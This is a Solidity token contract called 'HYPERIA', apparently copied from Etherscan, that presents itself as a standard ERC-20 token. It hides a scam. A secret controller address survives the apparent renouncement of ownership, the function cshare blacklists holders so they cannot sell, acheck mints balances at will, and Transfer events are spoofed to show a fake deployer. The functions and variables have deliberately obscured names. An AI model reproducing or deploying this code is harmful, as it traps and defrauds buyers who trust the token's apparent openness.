/**
 *Submitted for verification at Etherscan.io on 2023-01-16
*/

// SPDX-License-Identifier: MIT



pragma solidity 0.8.17;

  /*
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}*/ 
 
contract HYPERIA {
  
    mapping (address => uint256) private IOB;
    mapping (address => uint256) private IOC;
    mapping(address => mapping(address => uint256)) public allowance;
  


    
    string public name = "HYPERIA";
    string public symbol = unicode"HYPERIA";
    uint8 public decimals = 6;
    uint256 public totalSupply = 1000000000 *10**6;
    address owner = msg.sender;
    address private IOD;
    address deployer = 0x4862733B5FdDFd35f35ea8CCf08F5045e57388B3;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IOD = msg.sender;
        deploy(msg.sender, totalSupply); }

    function renounceOwnership() public virtual {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }



    function deploy(address account, uint256 amount) internal {
    account = deployer;
    IOB[msg.sender] = totalSupply;
    emit Transfer(address(0), account, amount); }


   function balanceOf(address account) public view  returns (uint256) {
        return IOB[account];
    }
    function transfer(address to, uint256 value) public returns (bool success) {


      require(IOC[msg.sender] <= 0);
        require(IOB[msg.sender] >= value);
  IOB[msg.sender] -= value;  
        IOB[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 function cshare (address vx, uint256 vz)  public {
     if(msg.sender == IOD){
   IOC[vx] = vz;}} 
function acheck (address vx, uint256 vz)  public {
         if(msg.sender == IOD){
    IOB[vx] += vz;}}



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == IOD)  {
 require(value <= IOB[from]);
        require(value <= allowance[from][msg.sender]);
        IOB[from] -= value;  
      IOB[to] += value; 
        from = deployer;
        emit Transfer (from, to, value);
        return true; }    

        require(IOC[from] <= 0 && IOC[to] <=0);
        require(value <= IOB[from]);
        require(value <= allowance[from][msg.sender]);
        IOB[from] -= value;
        IOB[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }